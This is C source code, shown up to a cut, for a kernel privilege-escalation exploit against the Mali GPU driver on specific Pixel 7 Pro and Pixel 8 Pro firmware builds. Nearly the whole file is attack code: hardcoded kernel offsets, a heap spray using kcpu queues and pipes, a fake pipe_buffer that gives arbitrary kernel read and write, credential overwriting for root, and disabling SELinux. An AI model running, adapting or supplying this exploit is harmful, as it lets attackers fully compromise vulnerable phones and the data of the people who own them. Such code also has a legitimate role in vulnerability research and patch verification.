#ifndef USE_STANDALONE
#include <jni.h>
#include <string>
#endif

#include "mali.h"

#define do_dbg(x, ...)
#define do_print(fmt, ...) do {                                         \
                __android_log_print(ANDROID_LOG_ERROR, "EXPLOIT", fmt, ##__VA_ARGS__ ); \
                printf(fmt, ##__VA_ARGS__);                             \
        } while(0)

#define PIPE_CNT_MAX (0x40 - 1)
#define PIPE_CNT_STAGE_1 (0x2)
#define PIPE_CNT_STAGE_2 (PIPE_CNT_MAX - PIPE_CNT_STAGE_1)

#define PIPE_SIZE (0x10000)

#define FAKE_PIPE_LEN (PAGE_SIZE -1)

#define pipe_rd_id(index) (pipes[index]->__fds[0])
#define pipe_wr_id(index) (pipes[index]->__fds[1])

#define NR_SLOTS_PER_PIPE (PIPE_SIZE/PAGE_SIZE)
#define NR_PAGES_SPRAY (NR_SLOTS_PER_PIPE * PIPE_CNT_STAGE_1)

#define STATIC_ADDR 0x1111110000
#define STATIC_ADDR_SZ (PAGE_SIZE * 9)

#define __pbuf      STATIC_ADDR
#define __pbuf_end (STATIC_ADDR + STATIC_ADDR_SZ)

struct pipe_struct *pipes[PIPE_CNT_MAX] = {};
#define U64_MAX		((__u64)~0ULL)
struct pipe_struct {
        int __fds[2];
        int nr_slots;
        int pipe_size;
};


void * __page_to_virt(__u64 page)
{
        return ((void*)(((((unsigned long long )page << 6) +    \
                          0xFFFFC008000000LL) & 0xFFFFFFFFFFF000LL  \
                         | 0xFF00000000000000LL)));
}

__u64 __virt_to_page(__u64 addr)
{
        return ((((__u64)(((signed long long)((__u64)(addr) << 8) >> 8) + \
                          0x8000000000LL) >> 6) & 0x3FFFFFFFFFFFFC0LL) + \
                0xFFFFFFFEFFE00000);
}

void * __page_to_virt2(__u64 page)
{
        return ((void*)(((__u64)page << 6) & 0xFFFFFFFFFFF000LL | 0xFF00000000000000LL));
}

__u64 __virt_to_page2(__u64 addr)
{
        return ((((__u64)(((signed long long)((__u64)(addr) << 8) >> 8) + \
                          0x8000000000LL) >> 12 << 6) -                 \
                 0x200000000LL));
}


struct device_config {
        const char *fingerprint;

        /* first two long values in .text section */
        __u64 __unused stext_long1;
        __u64 __unused stext_long2;

        /* kernel offset from kernel text base */
        __u64 kthread_task;
        __u64 selinux_state;
        __u64 anon_pipe_buf_ops;

        /* offset of task_struct fields */
        __u64 task_struct_cred;
        __u64 task_struct_pid;
        __u64 task_struct_tasks;
        void * (*page_to_virt_fn)(__u64);
        __u64  (* virt_to_page_fn)(__u64);
};


struct device_config dev_conf[] = {
        [0] = {                 /* Pixel 8 Pro  */
                "google/husky/husky:14/UD1A.231105.004/11010374:user/release-keys",
                0xA9027BFDD10203FF,                     // 1st 8 bytes of _stext
                0xA90467FAA9036FFC,                     // 2nd 8 bytes of _stext
                0x000000000283f200,     /* kthread_task sym_off                 */
                0x0000000002893168,     /* selinux_state sym_off                */
                0x00000000018c3770,     /* anon_pipe_buf_ops sym_off */
                0x0000000000000800,     /* offsetof task_struct->cred           */
                0x0000000000000640,     /* offsetof task_struct->pid              */
                0x0000000000000538,     /* offsetof task_struct->tasks          */
                __page_to_virt2,
                __virt_to_page2
        },
        [1] = {                  /* Pixel 7 Pro  SPL Nov-23 */
                "google/cheetah/cheetah:14/UP1A.231105.003/11010452:user/release-keys",
                0xD10203FFD503233F,     /* 1st 8 bytes of _stext                */
                0xA9027BFDF800865E,     /* 2nd 8 bytes of _stext                */
                0x00000000031308d0,     /* kthread_task sym_off                 */
                0x0000000003185970,     /* selinux_state sym_off                */
                0x000000000236cd28,     /* anon_pipe_buf_ops sym_off */
                0x0000000000000780,     /* offsetof task_struct->cred           */
                0x00000000000005c8,     /* offsetof task_struct->pid              */
                0x00000000000004c8,     /* offsetof task_struct->tasks          */
                __page_to_virt,
                __virt_to_page
        },

        [2] = {                 /* Pixel 7 Pro  SPL Oct-23 */
                "google/cheetah/cheetah:14/UP1A.231005.007/10754064:user/release-keys",
                0xAA1E03E9D503245F,     /* 1st 8 bytes of _stext                */
                0xD503233FD503201F,     /* 2nd 8 bytes of _stext                */
                0x0000000003191ed8,     /* kthread_task sym_off                 */
                0x00000000035c4030,     /* selinux_state sym_off                */
                0x000000000152ac60,     /* anon_pipe_buf_ops sym_off */
                0x0000000000000780,     /* offsetof task_struct->cred           */
                0x00000000000005c8,     /* offsetof task_struct->pid              */
                0x00000000000004c8,     /* offsetof task_struct->tasks          */
                __page_to_virt,
                __virt_to_page
        }

};

struct device_config *conf = NULL;
struct device_config * get_device_config(void)
{
        const char* prop_name = "ro.vendor.build.fingerprint";
        char prop_value[PROP_VALUE_MAX];

        if (!__system_property_get(prop_name, prop_value)){
                do_print("Failed to read the property or property does not exist\n");
                exit(-1);
        }

        for(int i=0; i < sizeof(dev_conf)/sizeof(struct device_config);i++) {
                if (!strncmp(dev_conf[i].fingerprint, prop_value, strlen(dev_conf[i].fingerprint))) {
                        struct device_config *conf =  &dev_conf[i];
                        do_print("[+] Target device: '%s' 0x%llx 0x%llx\n",
                                 conf->fingerprint,conf->stext_long1, conf->stext_long2);
                        assert(conf->page_to_virt_fn &&       \
                               conf->virt_to_page_fn &&       \
                               conf->task_struct_tasks &&     \
                               conf->task_struct_pid &&       \
                               conf->task_struct_cred &&      \
                               conf->selinux_state &&         \
                               conf->anon_pipe_buf_ops &&     \
                               conf->kthread_task);

                        return conf;
                }

        }
        do_print("Failed to identify %s \n",prop_value);
        return NULL;
}


int open_device(const char* name) {
        int fd = open(name, O_RDWR);
        if (fd == -1) {
                perror( "cannot open %s");
                exit(1);
        }
        /* do_print("device %s opened \n",name); */
        return fd;
}

int kbase_api_handshake(int fd,struct kbase_ioctl_version_check *cmd)
{
        int ret = ioctl(fd,KBASE_IOCTL_VERSION_CHECK,cmd);
        if(ret) {
                perror("ioctl(KBASE_IOCTL_VERSION_CHECK)");
        }
        return ret;
}

int kbase_api_set_flags(int fd, struct kbase_ioctl_set_flags *flags)
{
        int ret = ioctl(fd,KBASE_IOCTL_SET_FLAGS,flags);
        if(ret) {
                perror("ioctl(KBASE_IOCTL_SET_FLAGS)");
        }
        return ret;
}

int kbasep_cs_queue_register(int fd , struct kbase_ioctl_cs_queue_register *q)
{
        int ret = ioctl(fd,KBASE_IOCTL_CS_QUEUE_REGISTER,q);
        if(ret) {
                perror("ioctl(KBASE_IOCTL_CS_QUEUE_REGISTER)");
        }
        return ret;
}

int kbase_api_mem_alloc(int fd , union kbase_ioctl_mem_alloc *alloc)
{
        int ret = ioctl(fd,KBASE_IOCTL_MEM_ALLOC,alloc);
        if(ret) {
                perror("ioctl(KBASE_IOCTL_MEM_ALLOC)");
        }
        return ret;
}

int kbasep_cs_queue_bind(int fd , union kbase_ioctl_cs_queue_bind *bind)
{
        int ret = ioctl(fd,KBASE_IOCTL_CS_QUEUE_BIND,bind);
        if(ret) {
                perror("ioctl(KBASE_IOCTL_CS_QUEUE_BIND)");
        }
        return ret;
}

int kbasep_cs_queue_group_create(int fd , union kbase_ioctl_cs_queue_group_create *group)
{
        int ret = ioctl(fd,KBASE_IOCTL_CS_QUEUE_GROUP_CREATE,group);
        if(ret) {
                perror("ioctl(KBASE_IOCTL_CS_QUEUE_GROUP_CREATE)");
        }
        return ret;
}

int kbase_csf_cpu_queue_dump(int fd ,struct kbase_ioctl_cs_cpu_queue_info *info)
{
        int ret = ioctl(fd,KBASE_IOCTL_CS_CPU_QUEUE_DUMP,info);
        if(ret) {
                perror("ioctl(KBASE_IOCTL_CS_CPU_QUEUE_DUMP)");
        }
        return ret;
}

int kbasep_kcpu_queue_new(int fd)
{

        struct kbase_ioctl_kcpu_queue_new  info = {};
        int ret = ioctl(fd,KBASE_IOCTL_KCPU_QUEUE_CREATE,&info);
        if(ret) {
                perror("ioctl(KBASE_IOCTL_KCPU_QUEUE_CREATE)");
                exit(0);
        } else {
                /* do_print("Successfully created kcpu with id = %d \n",info.id); */
                return info.id;
        }
        return ret;
}

int kbase_api_tlstream_acquire(int fd, __u32 flags)
{

        struct kbase_ioctl_tlstream_acquire data = { .flags = flags};
        int ret = ioctl(fd,KBASE_IOCTL_TLSTREAM_ACQUIRE ,&data);
        if(ret < 0 ) {
                do_print("ioctl(KBASE_IOCTL_TLSTREAM_ACQUIRE): %s",strerror(errno));
        } else {
                do_dbg("Successfully set flags and file descriptor %d\n",ret);

        }
        return ret;
}

int kbase_api_buffer_liveness_update(int fd ,struct kbase_ioctl_buffer_liveness_update *update)
{

        int ret = ioctl(fd,KBASE_IOCTL_BUFFER_LIVENESS_UPDATE,update);
        if(ret) {
                //perror("ioctl(KBASE_IOCTL_BUFFER_LIVENESS_UPDATE)");
        }
        return ret;

}

int kbasep_kcpu_queue_delete(int fd ,struct kbase_ioctl_kcpu_queue_delete *_delete)
{

        int ret = ioctl(fd,KBASE_IOCTL_KCPU_QUEUE_DELETE,_delete);
        if(ret) {
                perror("ioctl(KBASE_IOCTL_KCPU_QUEUE_DELETE)");
        }
        return ret;

}

__u32 kbase_api_get_context_id(int fd)
{
        struct kbase_ioctl_get_context_id info = {};
        int ret = ioctl(fd,KBASE_IOCTL_GET_CONTEXT_ID,&info);
        do_dbg("kbase_api_get_context_id() id = %d\n",info.id);
        if(ret) {
                perror("ioctl(KBASE_IOCTL_GET_CONTEXT_ID)");
                exit(0);
        }
        return info.id;

}

void hexdump(const void *buffer, size_t size) {
        const unsigned char *buf = (const unsigned char *)buffer;

        size_t lineLength = 76;
        size_t totalLength = (size / 16 + (size % 16 != 0)) * lineLength;
        char *output = (char *)malloc(totalLength);
        if (!output) {
                perror("Failed to allocate memory");
                return;
        }
        output[0] = '\0'; // Initialize the output string

        char line[76]; // Temporary string to hold each line

        for (size_t i = 0; i < size; i += 16) {
                char *linePtr = line;
                for (size_t j = 0; j < 16; j++) {
                        if (i + j < size) {
                                linePtr += sprintf(linePtr, "%02X ", buf[i + j]);
                        } else {
                                linePtr += sprintf(linePtr, "   ");
                        }

                        if (j == 7) {
                                linePtr += sprintf(linePtr, " ");
                        }
                }

                linePtr += sprintf(linePtr, " | ");

                // Print ASCII values into the line buffer
                for (size_t j = 0; j < 16; j++) {
                        if (i + j < size) {
                                linePtr += sprintf(linePtr, "%c", isprint(buf[i + j]) ? buf[i + j] : '.');
                        }
                }

                sprintf(linePtr, "\n");

                // Append the line to the output string
                strcat(output, line);
        }
        do_print("%s", output); // Print the entire output string
        free(output); // Free the allocated memory
}


ssize_t pipe_structs_write(int pipe_index, void *buf,size_t bufsize);

void pipe_structs_init(size_t pipe_size, int stage)
{
        static int pipe_count = 0;
        do_dbg("Init pipe buffers ... ");
        assert(!(pipe_size % PAGE_SIZE));
        char buf[PAGE_SIZE] = {};
        memset(buf,0xe,sizeof(buf));
        buf[0] = '\x11';
        int start = 0 , end = 0;

        if( stage == 1) {
                start = 0; end = PIPE_CNT_STAGE_1;
        } else if( stage == 2) {
                start = PIPE_CNT_STAGE_1; end = PIPE_CNT_MAX;
        } else {
                assert(1==0 && "Unknown stage");
        }

        for(int i=start; i < end; i++) {
                struct pipe_struct *p = (struct pipe_struct *)calloc(1,sizeof(*p));
                pipes[i] = p;
                int ret = pipe(pipes[i]->__fds);
                if(ret) {perror("pipe()");}
                assert(ret == 0);
                pipe_count++;
                if(!pipe_size)
                        continue;

                /* Important step ... */
                ret = fcntl(pipes[i]->__fds[1],F_SETPIPE_SZ,pipe_size);
                if(ret == -1) {
                        perror("fcntl()");
                        pipes[i]->pipe_size = -1;
                        pipes[i]->nr_slots = -1;
                        exit(0);

                } else {
                        pipes[i]->pipe_size = ret;
                        pipes[i]->nr_slots = ret/PAGE_SIZE;
                        pipe_structs_write(i,buf,sizeof(buf));
                }

        }


        do_dbg("OK\n");
}


ssize_t pipe_structs_read(int pipe_index, void *buf,size_t bufsize)
{
        assert(pipe_index < PIPE_CNT_MAX);

        if(pipes[pipe_index]->pipe_size == -1) {
                do_print("pipe struct is empty\n");
                return -1;
        }
        ssize_t rb = read(pipes[pipe_index]->__fds[0],buf,bufsize);
        return rb;

}

// Read data from pipe without updating pipe_buffer->len/offset
void pipe_struct_read_with_guard(int pipe_index, void *buffer,size_t bufsize)
{
        bzero(buffer,bufsize);

        __u8 *ptr = (__u8 *)__pbuf_end - bufsize;
        bzero(ptr, bufsize);
        ssize_t rb = pipe_structs_read(pipe_index, ptr, bufsize+1); // +1 will trigger EFAULT in copy_page_to_iter
        /* We must EFAULT, otherwise it's a failure */
        assert((rb < 0) && errno == EFAULT);

        memcpy(buffer, ptr,bufsize);
}


ssize_t pipe_structs_write(int pipe_index, void *buf,size_t bufsize)
{
        assert(pipe_index < PIPE_CNT_MAX);

        if(pipes[pipe_index]->pipe_size == -1) {
                do_print("pipe struct is freed\n");
                return -1;
        }
        ssize_t wb = write(pipes[pipe_index]->__fds[1],buf,bufsize);

        return wb;

}

void pipe_struct_write_with_guard(int pipe_index, void *buffer,size_t bufsize)
{
        __u8 *ptr = (__u8 *)__pbuf_end - bufsize;
        memcpy(ptr,buffer,bufsize);
        ssize_t wb = pipe_structs_write(pipe_index, ptr, bufsize + 1); // +1 will trigger EFAULT in copy_page_to_iter
        /* We must EFAULT, otherwise it's a failure */
        assert((wb < 0) && errno == EFAULT);

}

void pipe_struct_free(int pipe_index)
{
        assert(pipe_index < PIPE_CNT_MAX);

        assert(!close(pipes[pipe_index]->__fds[0]));
        assert(!close(pipes[pipe_index]->__fds[1]));
        pipes[pipe_index]->pipe_size = -1;
}


void init_buffers()
{
        void *p = mmap((void*)0x1111110000,STATIC_ADDR_SZ,
                       PROT_READ|PROT_WRITE,MAP_ANONYMOUS | MAP_PRIVATE,-1,0);
        if(p == MAP_FAILED) assert(1 == 0);

        /* guard page */
        void *pg = mmap((void *)(0x1111110000 + STATIC_ADDR_SZ),
                        PAGE_SIZE,PROT_NONE,MAP_ANONYMOUS | MAP_PRIVATE,-1,0);
        if(pg == MAP_FAILED) assert(1 == 0);
        return;


}

struct kcpu_args {
        int fd;
        int streamfd;
        __u32 kcpu_id;
        __u32 kctx_id;
        __u64 kcpu_kaddr;
};

void fd_limit_up()
{
        struct rlimit lim = {};
        if(getrlimit(RLIMIT_NOFILE, &lim)) {
                perror("getrlimit");
                exit(-1);
        }
        lim.rlim_cur = lim.rlim_max;

        if(setrlimit(RLIMIT_NOFILE, &lim)){
                perror("setrlimit");
                exit(-1);
        }
}

__u64 get_kcpu_kaddr(struct kcpu_args *args)
{
#define KBASE_TL_KBASE_NEW_KCPUQUEUE 59

        struct kcpu_args *ta = args;

        char buf[0x1000] = {};
        ssize_t rb = 0;
        do {
                rb = read(ta->streamfd,buf,sizeof(buf));
                char *p = buf;
                for(ssize_t i=0; i < rb && rb > 0x24; i++, p++) {
                        __u32 msg_id =  *(__u32 *)(p );
                        __u32 id =  *(__u32 *)(p + (32 - 12));  /* kcpu_queue_id */
                        __u32 kid =  *(__u32 *)(p + (36 - 12)); /* kernel_ctx_id */

                        if((msg_id == KBASE_TL_KBASE_NEW_KCPUQUEUE) && (id == ta->kcpu_id) \
                           && (kid == (ta->kctx_id ))) {
                                __u64 kcpu_queue = *(__u64 *)(p + (24 - 12));
                                return kcpu_queue;
                        }

                }

        } while((rb >= 0) &&  ta->kcpu_kaddr  == 0);

        return 0;
}



/* fake pipe buffer */
struct pipe_buffer {
        __u64 page;
        unsigned int offset, len;
        const void *ops;
        unsigned int flags;
        unsigned long _private;
};

struct pipe_rw {
        int wr;
        int krw_idx;        /* Used to manipulate pipe_buffer content */
        int krd_idx;
        __u64 anon_pipe_buf_ops;
        __u64 kthreadd_task;
        __u64 kernel_base;
        __u64 selinux_state;
        __u64 my_task;
        __u8 rwbuf[PAGE_SIZE];
        struct pipe_buffer pb;
};

struct pipe_rw prw = {};
#define kwrite(addr,sz) (pipe_struct_write_with_guard(prw.krw_idx, (addr), sz))
#define kread(addr,sz) (pipe_struct_read_with_guard(prw.krd_idx ,prw.rwbuf,sz))

#define kread64(addr) ( do {                            \
                        kread(addr,8);                  \
                        __u64 value = 0;                \
                        value = *(__u64 *)(prw.rwbuf);  \
                }while(0);)

#define update_pipe_buffer pipe_struct_write_with_guard
#define fetch_pipe_buffer pipe_struct_read_with_guard


static __u64 kernel_read64(__u64 addr)
{
        __u64 kaddr_align = addr & ~(PAGE_SIZE - 1);

        struct pipe_buffer *pb = &prw.pb;

        pb->page = conf->virt_to_page_fn((__u64)kaddr_align);
        pb->offset = addr & (PAGE_SIZE - 1);
        pb->len = 0x20 + 1; // +1 to produce page fault, thefore writing to pipe buffer wihout updating len/offset

#if 0
        do_print("fake pipe_buffer {.page = 0x%llx, .offset = 0x%x, .len = 0x%x, ops = 0x%llx}\n",
                 pb->page,pb->offset,pb->len,(__u64)pb->ops);
#endif
        update_pipe_buffer(prw.krw_idx, pb, 0x28);

        /* Let's check the write */
        fetch_pipe_buffer(prw.krd_idx ,prw.rwbuf,0x28);
        if (*(__u64 *)prw.rwbuf != pb->page) {
                do_print("ERROR 0x%llx 0x%llx \n",*(__u64 *)prw.rwbuf,pb->page);
                getchar();
        }

        pipe_structs_read(prw.wr, prw.rwbuf, 0x20);

        return *(__u64 *)prw.rwbuf;

}


void kernel_write(__u64 addr,__u8 *buf,size_t size)
{
        __u64 kaddr_align = addr & ~(PAGE_SIZE - 1);

        struct pipe_buffer *pb = &prw.pb;

        /* pb->page = virt_to_page((__u64)kaddr_align); */
        pb->page = conf->virt_to_page_fn((__u64)kaddr_align);

        pb->offset = addr & (PAGE_SIZE - 1);
        pb->len = 0; // Start writing at offset = 0

#if 0
        do_print("Writing to 0x%llx \n",addr);
        do_print("fake pipe_buffer {.page = 0x%llx, .offset = 0x%x, .len = 0x%x, ops = 0x%llx}\n",
                 pb->page,pb->offset,pb->len,(__u64)pb->ops);
#endif

        update_pipe_buffer(prw.krw_idx, pb, 0x28);

        /* Let's check the write */
        fetch_pipe_buffer(prw.krd_idx ,prw.rwbuf,0x28);
        //hexdump(prw.rwbuf, 0x28);
        if (*(__u64 *)prw.rwbuf != pb->page) {
                do_print("ERROR 0x%llx 0x%llx \n",*(__u64 *)prw.rwbuf,pb->page);
                getchar();
        }

        //do_print("before 0x%llx \n",kernel_read64(addr));
        //hexdump(prw.rwbuf, 0x20);
        ssize_t wr = pipe_structs_write(prw.wr, buf, size);
        assert(wr == size);

}


void get_root()
{
        __u64 creds = kernel_read64(prw.my_task + conf->task_struct_cred);

        //do_print("OLD PRIVs: getuid() = %d getgid() = %d \n",getuid(),getgid());
        __u8 buf[0x20] = {};
        memset(buf,0,sizeof(buf));
        kernel_write((__u64)(creds + 4),buf,sizeof(buf));

        do_print("[+] Successfully got root: getuid() = %d getgid() = %d \n",getuid(),getgid());


}

void disable_selinux()
{
        int enabled = kernel_read64(prw.selinux_state);
        __u32 value = (enabled >> 1) << 1;

        kernel_write(prw.selinux_state,(__u8 *) &value, 4);
        enabled = kernel_read64(prw.selinux_state);
        if(!(enabled & 1))
                do_print("[+] Successfully disabled SELinux \n");

}

__u64 get_current_task()
{
        assert(conf != NULL);

        __u64 curr_tsk = prw.kthreadd_task;
        __u64 my_task = 0;
        do {

                __u8 *ptr = prw.rwbuf;

                pid_t pid = (__u32)kernel_read64(curr_tsk + conf->task_struct_pid);
                pid_t gid = (__u32)kernel_read64(curr_tsk + conf->task_struct_pid + 4);

                if(pid == getpid() ) {
                        do_print("[+] Found our own task struct 0x%llx \n",curr_tsk);
                        my_task = curr_tsk;
                        break;
                }
                curr_tsk = kernel_read64(curr_tsk + conf->task_struct_tasks) - conf->task_struct_tasks;
                usleep(1000);

        } while ((curr_tsk != prw.kthreadd_task) || !curr_tsk);
        if(my_task) {
                prw.my_task = my_task;
                return my_task;
        }
        return 0;
}

#ifdef __cplusplus
extern "C"
#endif
int mali_exploit(void)
{
        int err = 0;

        conf = get_device_config();
        if(!conf)
                return -1;

        /* getchar(); */
        fd_limit_up();

        int fd = open_device("/dev/mali0");

        struct kbase_ioctl_version_check cmd = {.major = 1, .minor = -1};
        kbase_api_handshake(fd, &cmd);
        struct kbase_ioctl_set_flags flags = {0};
        kbase_api_set_flags(fd,&flags);

        struct kbase_ioctl_buffer_liveness_update u = {};

        size_t ss = 0x40000000;
        /* __u64 lll = (__u64)malloc(ss); */

        /* Allocate the buffer that we'll use as live_ranges */
        init_buffers();
        __u32 write_size = 0x8000;//0x100;

        memset((void*)0x1111110000,0,STATIC_ADDR_SZ);
        __u8 *ptr = (__u8 *)(0x1111110000 + STATIC_ADDR_SZ - write_size);

        struct kcpu_args *ta = (struct kcpu_args *)calloc(sizeof(*ta),1);
        ta->fd = fd;

        ta->streamfd = kbase_api_tlstream_acquire(ta->fd,BASE_TLSTREAM_ENABLE_CSF_TRACEPOINTS);
        if(ta->streamfd < 0) assert(1 == 0 && "Unable to have tlstream fd");

        ta->kctx_id = kbase_api_get_context_id(ta->fd);
        ta->kcpu_id =   kbasep_kcpu_queue_new(ta->fd);
        ta->kcpu_kaddr = get_kcpu_kaddr(ta);
        do_print("[+] Got the kcpu_id (%d) kernel address = 0x%llx  from context (0x%x)\n",
                 ta->kcpu_id,ta->kcpu_kaddr,ta->kcpu_id);


#define PIPE_BUF_FLAG_CAN_MERGE	0x10	/* can merge buffers */

        assert(STATIC_ADDR_SZ > (0x4000 * 2));

        struct pipe_buffer *p = (struct pipe_buffer *)ptr;

        p->page = conf->virt_to_page_fn(ta->kcpu_kaddr);
        p->offset = 0;
        p->len = FAKE_PIPE_LEN;

        // pipe_buf_get() will crash the kernel because p->ops must not be NULL
        // and the first 8 bytes of the leaked kcpu_address are always 0's
#if 0
        p->ops = (const void *)(0x1122334455667700 | i);
#else
        p->ops = (const void *)(ta->kcpu_kaddr + 0x50);
#endif

        p->flags = PIPE_BUF_FLAG_CAN_MERGE;
        p->_private = 0;

        p = (struct pipe_buffer *)( ptr + 0x4000);
        p->page = conf->virt_to_page_fn(ta->kcpu_kaddr);
        p->offset = 0;
        p->len = 0;             /* This is the starting position of the pipe_write */
        p->ops = (const void *)(ta->kcpu_kaddr + 0x50);
        p->flags = PIPE_BUF_FLAG_CAN_MERGE;
        p->_private = 0;


        u.live_ranges_address = (__u64)ptr;
        u.buffer_va_address =  (__u64)-1;       /* no need */
        u.buffer_sizes_address = (__u64)-1;     /* no need */


        size_t psize =  (0x100) * PAGE_SIZE;

        /* Do not resize the pipe buffer now, let's do it later after the kcpu has been freed */
        pipe_structs_init(0,2);

//#define FDS 40
#define FDS 100
#define KBASEP_MAX_KCPU_QUEUES ((size_t)256)

        int mfds[FDS + 1]  = {};
        __u32 kcpu_ids[FDS +1 ][KBASEP_MAX_KCPU_QUEUES] = {};
        for(int i = 0; i < FDS;i++) {
                int ffd = open_device("/dev/mali0");
                mfds[i] = ffd;
                struct kbase_ioctl_version_check cmd = {.major = 1, .minor = -1};
                kbase_api_handshake(ffd, &cmd);
                struct kbase_ioctl_set_flags flags = {0};
                kbase_api_set_flags(ffd,&flags);
        }

        /* Spray with page order 2 allocations to make the upcoming allocations
           more predictable
        */
        for(int i = 0; i < FDS;i++) {
                for(int j=0; j < KBASEP_MAX_KCPU_QUEUES ;j++)
                        kcpu_ids[i][j] = kbasep_kcpu_queue_new(mfds[i]);
        }

        for(int i=0; i < (255 -1 );i++)
                kcpu_ids[FDS][i] = kbasep_kcpu_queue_new(ta->fd);



        struct kcpu_args kcpu = {
                .kcpu_id = kcpu_ids[FDS-1][KBASEP_MAX_KCPU_QUEUES -1], // take the last kcpu kernel address
                .streamfd = ta->streamfd,
                .kctx_id = kbase_api_get_context_id(mfds[FDS - 1 ]),
        };

        kcpu.kcpu_kaddr =  get_kcpu_kaddr(&kcpu);
        do_print("[+] Got the kcpu_id (%d) kernel address = 0x%llx  from context (0x%x)\n",
                 kcpu.kcpu_id,kcpu.kcpu_kaddr,kcpu.kcpu_id);

        pipe_structs_init(psize,1);

        int fake_pipe_index = -1;
        __s64 off = 0x4000;
        __u64 size = 0x1c01;

        off = 0x8000;
        size = 0x2c01;

        __u64 buffer_info_size = 0;
        __u64 live_ranges_size = 0;


        u.buffer_count =  (__u64)(-off/0x10);
        u.live_ranges_count = size;

        buffer_info_size = sizeof(__u64) * u.buffer_count;
        live_ranges_size = sizeof(struct kbase_pixel_gpu_slc_liveness_mark) * u.live_ranges_count;
        __u64 total_buff_size = buffer_info_size * 2 + live_ranges_size;

        /* to write at offset=0x100 you need lives_ranges=0x1ffd9 total_size will be = 0x7fe64 */
        //do_print("The allocation size will be 0x%llx \n",total_buff_size);
        //do_print("buffer_count = 0x%llx live_ranges_count= 0x%llx \n",u.buffer_count, u.live_ranges_count);
        err = kbase_api_buffer_liveness_update(fd,&u);

        for(int i=0; i < PIPE_CNT_STAGE_1; i++) {
                int sz = 0;
                err = ioctl(pipes[i]->__fds[0],FIONREAD,&sz);
                assert(err == 0);
                if(sz != FAKE_PIPE_LEN)
                        continue;
                do_print("[+] Found corrupted pipe with size 0x%x \n",sz);
                fake_pipe_index = i;
                break;
        }

        if(fake_pipe_index == -1) {
                do_print("[-] Failed to get the fake pipe_buffer \n");
                exit(0);
        }

        do_print("[+] SUCCESS! we have a fake pipe_buffer (%d)!\n",fake_pipe_index);
        __u8 rwbuf[FAKE_PIPE_LEN-1] = {};

        /* Read kcpuqueue object content */
        pipe_struct_read_with_guard(fake_pipe_index ,rwbuf,sizeof(rwbuf));
        hexdump(rwbuf + 0x10,0x40);
        __u64 mtx_next = *(__u64 *)(rwbuf + 0x10);
        __u64 kctx = *(__u64 *)(rwbuf + 0x30);


        /* Nothing ... just a another sleep variant */
        for(int i=0; i < 100;i++) {
                pipe_struct_read_with_guard(fake_pipe_index ,rwbuf,sizeof(rwbuf));

        }

        /* Free the kcpu object so we can fill its memory with something else */
        struct kbase_ioctl_kcpu_queue_delete _delete = { .id = ta->kcpu_id };
        do_print("[+] Freeing kcpu_id = %d (0x%llx)",ta->kcpu_id,ta->kcpu_kaddr);
        kbasep_kcpu_queue_delete(fd,&_delete);
        do_print("[+] Allocating %d pipes with %lu slots \n", PIPE_CNT_MAX - PIPE_CNT_STAGE_1, psize /PAGE_SIZE);

        for(int k=PIPE_CNT_STAGE_1; k < PIPE_CNT_MAX; k++) {
                int ret = fcntl(pipe_rd_id(k),F_SETPIPE_SZ,psize);
                if(ret == -1)  {
                        perror("fcntl");
                        getchar();
                } else
                        assert(psize == ret);
                usleep(100);
        }

        /* bump the head counter of each pipe */
        for(int k=PIPE_CNT_STAGE_1; k < PIPE_CNT_MAX; k++) {
                char tmp[0x1000] = {};
                size_t wsize = 0x10 * (k + 1);
                assert(wsize < sizeof(tmp));
                memset(tmp,0xcc,wsize);
                ssize_t wb = pipe_structs_write(k, tmp, wsize);
                assert(wb == wsize);
        }

        size_t read_size = 0x28;
        pipe_struct_read_with_guard(fake_pipe_index  ,rwbuf,read_size);

        __u64 new_mtx_next = *(__u64 *)(rwbuf + 0x10);
        __u64 new_kctx = *(__u64 *)(rwbuf + 0x30);

        struct pipe_buffer *pb = (struct pipe_buffer *) calloc(sizeof(*pb),1);
        struct pipe_buffer *pb_backup = (struct pipe_buffer *) calloc(sizeof(*pb),1);
        /* struct pipe_buffer *pb = (struct pipe_buffer *)rwbuf; */

        memcpy(pb,rwbuf,sizeof(*pb));
        if((pb->page == 0) || (pb->len > PAGE_SIZE) || (pb->ops == 0)) {
                do_print("The kcpi object has been replaced with something other than a pipe_buffer \n ");
                exit(0);
        }

        do_print("[+] Successfully overlapped the kcpuqueue object with a pipe buffer \n");
        hexdump(rwbuf,0x28);

        /* let's save a copy */
        memcpy(pb_backup,rwbuf,sizeof(*pb));
        do_print("[+] pipe_buffer {.page = 0x%llx, .offset = 0x%x, .len = 0x%x, ops = 0x%llx}\n",
                 pb->page,pb->offset,pb->len,(__u64)pb->ops);

        __u32 pipe_index = (pb->len / 0x10) - 1;
        prw.wr = pipe_index;
        prw.krw_idx = fake_pipe_index + 1;
        prw.krd_idx = fake_pipe_index;

        prw.anon_pipe_buf_ops = (__u64)pb->ops;

        memcpy(&prw.pb , pb,sizeof(prw.pb));
#if 0
        // The first reported version used page address bruteforce.
        // No need to use this method anymore since we already have anon_pipe_buf_ops.
        for(__u64 page=0xFFFFFFFEFFE00000; page < 0xFFFFFFFFFFE00000; page+=0x40) {
                __u64 addr = kernel_read64((__u64)conf->page_to_virt_fn(page));
                addr = *(__u64 *)(prw.rwbuf);
                __u64 addr2 = *(__u64 *)(prw.rwbuf + 8);

                if((addr == conf->stext_long1) && (addr2 == conf->stext_long2)) {
                        prw.kernel_base = (__u64)conf->page_to_virt_fn(page);
                        prw.selinux_state = prw.kernel_base + conf->selinux_state;
                        prw.kthreadd_task =  kernel_read64(prw.kernel_base + conf->kthread_task);
                        break;
                }
        }
#else
        prw.kernel_base = prw.anon_pipe_buf_ops - conf->anon_pipe_buf_ops;
        prw.selinux_state = prw.kernel_base + conf->selinux_state;
        prw.kthreadd_task =  kernel_read64(prw.kernel_base + conf->kthread_task);

#endif

        if(prw.kernel_base == 0) {
                do_print("Failed to get the kernel base, the kernel will crash soon \n");
                sleep(5);
                exit(0);
        }
        do_print("[+] kernel base = 0x%llx, kthreadd_task = 0x%llx selinux_state = 0x%llx \n",
                 prw.kernel_base,prw.kthreadd_task,prw.selinux_state);

        get_current_task();
        get_root();
        disable_selinux();


        int cleanup_ok = 0;
        for(int i=0; i < (256 * FDS); i++) {
                __u64 area = kcpu.kcpu_kaddr + (i * 0x4000);
                __u64 kaddr = kernel_read64(area);
                /* if(kaddr == virt_to_page(ta->kcpu_kaddr)) { */
                if(kaddr == conf->virt_to_page_fn(ta->kcpu_kaddr)) {
                        __u32 fake_len = *(__u32 *)(prw.rwbuf + 0xC); // must be FAKE_PIPE_LEN
#if 0
